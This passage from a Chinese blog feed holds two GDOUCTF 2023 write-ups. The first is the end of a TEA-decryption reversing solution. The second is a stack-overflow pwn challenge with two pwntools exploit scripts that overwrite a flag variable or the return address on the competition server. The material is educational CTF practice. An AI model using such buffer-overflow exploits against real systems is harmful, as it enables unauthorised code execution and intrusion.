punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v7存放密钥key  </span>    v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5678</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9012</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3456</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v8存放密文  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">444599258</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">140107365</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1226314200</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">234802392</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">359413339</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1013885656</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2066432216</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">249921817</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">856928850</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">576724359</span><span class="token punctuation">;</span>        <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 先修改v7的值  </span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// tea的解密算法  </span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 输出明文  </span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m<span class="token punctuation">)</span>              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{hzCtf_94_re666fingcry5641qq}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea9.png" alt="2023GDOUCTF-tea9.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛的一道逆向题，关于魔改 tea 算法的解密，不过要注意 key 被换了，关键在于寻找 tea 算法中最关键的：δ（Delta）和 key，根据伪代码改写解密脚本</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】EASY_PWN</title>
    <link href="https://www.4ss1du0us.cn/2023/04dcd6636.html"/>
    <id>https://www.4ss1du0us.cn/2023/04dcd6636.html</id>
    <published>2023-04-20T09:52:37.000Z</published>
    <updated>2023-06-07T12:00:04.847Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>比较经典的栈溢出，但是<mark>不要被前面的猜随机数迷惑了，直接溢出修改关键值</mark></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】EASY_PWN</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在 Ubuntu 下分析文件，并给予执行权限运行：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN1.png" alt="2023GDOUCTF-EASY_PWN1.png"></p></li><li><p>用 64 位 IDA 打开，定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN2.png" alt="2023GDOUCTF-EASY_PWN2.png"><br>主要是函数 <code>check()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN3.png" alt="2023GDOUCTF-EASY_PWN3.png"></p></li><li><p>注意到有个 <code>print_flag()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN4.png" alt="2023GDOUCTF-EASY_PWN4.png"><br>这个函数读取了靶机上的 <code>flag.txt</code> 文件，并将里面的内容输出，因此执行这个函数可以直接获得 <code>flag</code></p></li><li><p>在 <code>check()</code> 函数的前半段有一个生成随机数的代码：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN5.png" alt="2023GDOUCTF-EASY_PWN5.png"><br>这里调用 <code>urandom</code> 文件往 <code>buf</code> 中写入随机数<br>然后通过 <code>gets()</code> 获取用户输入 <code>s1</code>，如果 <code>s1</code> 与 随机生成的 <code>buf</code> 相等，就将 <code>v5</code> 的值改为 1<br>当 <code>v5 == 1</code> 时就可以调用 <code>print_flag()</code> 函数输出 flag</p></li><li><p>由于这里输入使用的是 <code>gets()</code> 函数，也就是说 <code>s1</code> 是必定可以溢出的<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN6.png" alt="2023GDOUCTF-EASY_PWN6.png"><br>观察栈中数据的位置，发现 <code>v5</code> 在 <code>s1</code> 的下方，因此 <code>v5</code> 是可以被 <code>s1</code> 通过 <code>gets()</code> 覆盖的</p></li></ol><blockquote><p>这里注意：<br><strong>不要被前面的猜随机数给迷惑了</strong><br><strong>是否执行 <code>print_flag()</code> 函数取决于 <code>v5</code> 的值是否非 0，而与是否猜对 <code>buf</code> 中的内容无关</strong><br><strong>因此大可不必去管 <code>urandom</code> 生成的随机数是什么</strong></p></blockquote><ol start="6"><li><p>除此之外，通过 <code>s1</code> 直接覆盖返回值执行 <code>print_flag()</code> 函数也是可以的</p></li><li><p>因此这个题有两种思路：<br>① 通过溢出 <code>s1</code> 修改 <code>v5</code> 的值，只要将 <code>v5</code> 改为非 0 值即可<br>② 通过溢出 <code>s1</code> 修改函数返回地址，使其直接跳转到 <code>print_flag()</code> 函数</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><ul><li>将 v5 的值修改为 1（或者其他非 0 值都可以）</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">-</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从s1到v5需要填充0x1F - 0x04个字节，p64(1)将v5修改为1</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><ul><li>直接将返回地址修改为 <code>print_flag()</code> 的地址<br>（<em>不过有一点不太明白，既然开启了 PIE 地址随机化，为什么还能直接得到 <code>print_flag()</code> 的真实地址</em>）</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>print_flag <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'print_flag'</span><span class="token punctuation">]</span>  <span class="token comment"># 通过elf获取ptint_flag()函数的地址</span><span class="token comment"># ptint_flag_addr = 0x0011D5  # 在IDA直接查看ptint_flag()函数的地址，两种方法都可以</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>print_flag<span class="token punctuation">)</span>        <span class="token comment"># payload = b'a' * (0x1F + 0x08) + p64(ptint_flag_addr)  # 两种方法都可以</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{2e00ef92-c970-45a0-b36e-2287f14151d5}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-EASY_PWN7.png" alt="2023GDOUCTF-EASY_PWN7.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中一道简单的栈溢出类 pwn 题，虽然前面看起来像是让猜生成的随机数，其实与 flag 的获取关系并不大，不要被迷惑了</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
</feed>
